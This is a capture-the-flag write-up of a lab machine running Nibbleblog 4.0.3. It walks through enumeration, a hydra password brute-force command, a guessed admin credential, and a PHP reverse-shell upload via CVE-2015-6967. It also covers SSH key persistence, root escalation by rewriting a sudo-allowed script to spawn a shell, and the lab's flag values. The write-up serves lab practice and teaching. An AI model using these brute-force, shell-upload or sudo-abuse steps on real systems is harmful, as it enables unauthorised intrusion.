
Target : 10.129.26.24

Started off with the port scan : 22, 80

Enumerating port 80:

*Directory bruteforcing for finding interesting endpoints:*

![](../Pasted%20image%2020260703110112.png)

When visiting http://10.129.26.24  /nibbleblog page is found in page source

Further enumeration revealed 

![](../Pasted%20image%2020260703111421.png)

http://10.129.26.24/nibbleblog/update.php which disclosed version information which is    *

*Nibbleblog 4.0.3* - _CVE_-2015-6967 (for exploiting this we need valid credential pair)

/nibbleblog/admin.php is the login page. 
/nibbleblog/content/private/users.xml ( from this we confirmed the username is admin)

Password Cracking with hydra:

`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.26.24 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:F=Incorrect username or password"`

But failed. Tried guessing passwords, and got the cred

`admin:nibbles`

**Exploiting CVE_-2015-6967:**

step 01: Visit: http://10.129.26.24/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image
step 02: upload php rev shell
step 03: start the listener
step 04: trigger it (/nibbleblog/content/private/plugins/my_image/image.php)

Got shell as user - nibbler

`user.txt : 5ccd647babc3cd3be9d65904352904f3`

we have write access to the directory, we can create .ssh folder and add public key gain access through ssh

`ssh -i id_rsa nibbler@nibbles.htb`

Root Escalation:

sudo -l 

```
nibbler@Nibbles:~/personal/stuff$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

We can execute monitor.sh, also we had write access to the file and the directory. Modified the script as 

```
#!/bin/bash

/bin/bash -p
```

makesure to modify execute permission : `chmod +x monitor.sh`

`sudo /home/nibbler/personal/stuff/monitor.sh`            (got root shell)

![](../Pasted%20image%2020260703123524.png)

` root.txt : 66f7a7ec08840e10280cf4ea6ffc41dc `


To be noted:

1. Stuck in two places - guessing password and viewing sudo -l 
2. Makesure to check all the low hangings first, then proceed with further enumeration.